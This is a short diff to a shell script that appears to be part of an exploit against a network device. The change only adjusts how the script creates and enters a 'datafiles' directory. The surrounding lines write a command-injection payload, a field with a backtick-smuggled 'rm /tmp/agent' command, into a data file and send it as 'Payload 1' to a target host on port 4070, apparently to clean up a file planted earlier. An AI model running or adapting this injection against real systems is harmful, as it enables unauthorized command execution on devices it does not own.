@@ -35,8 +35,13 @@ then
 fi
 
 echo "[*] Creating Data File."
-mkdir ./datafiles
-cd ./datafiles
+if [ "$(ls | egrep -q datafiles && echo "1" || echo "0")" = "0" ]
+then
+  mkdir datafiles
+  cd ./datafiles
+else
+  cd ./datafiles
+fi
 echo 'command_blink_on;044;'${TMAC}';1`rm /tmp/agent`;' > data1.txt
 echo "[*] Data File Created."
 
@@ -44,5 +49,5 @@ echo "[*] Executing"
 echo "[*] Sending Payload 1"
 ${CMDEXEC} -2 -p 4070 -c 1 -E data1.txt -d 150 ${TARGET} 2> /dev/null
 echo ""
-
+cd ../
 echo "[*] 'agent' Script Removed."
